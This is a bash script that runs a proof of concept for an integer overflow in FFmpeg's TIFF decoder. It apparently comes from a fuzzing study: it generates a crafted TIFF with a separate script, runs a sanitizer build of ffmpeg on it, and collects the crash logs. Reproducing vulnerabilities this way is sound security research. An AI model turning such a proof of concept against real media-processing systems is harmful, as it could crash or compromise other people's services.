#!/bin/bash
# PoC run script for VULN 001 - Integer Overflow in five_planes Allocation
# FFmpeg libavcodec/tiff.c decode_frame() lines 2215-2219

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
TIFF=vuln_001_input.tiff
RESULT=vuln_001_result.txt

# Clean up previous run artifacts
rm -f "$RESULT" asan.log.* ubsan.log.*

echo "[*] Step 1: Generating crafted TIFF..."
python3 vuln_001_gen.py

echo "[*] Step 2: Running ffmpeg on crafted TIFF (ASAN+UBSAN)..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:detect_leaks=0:exitcode=0" \
UBSAN_OPTIONS="print_stacktrace=1:log_path=./ubsan.log:abort_on_error=0:exitcode=0" \
  "$BIN" -i "$TIFF" -f null - > "$RESULT" 2>&1 || true

echo "[*] Step 3: Collecting sanitizer logs..."
for f in asan.log.* ubsan.log.*; do
  if [ -f "$f" ]; then
    echo "=== $f ===" >> "$RESULT"
    cat "$f" >> "$RESULT"
  fi
done

echo ""
echo "=== vuln_001_result.txt ==="
cat "$RESULT"
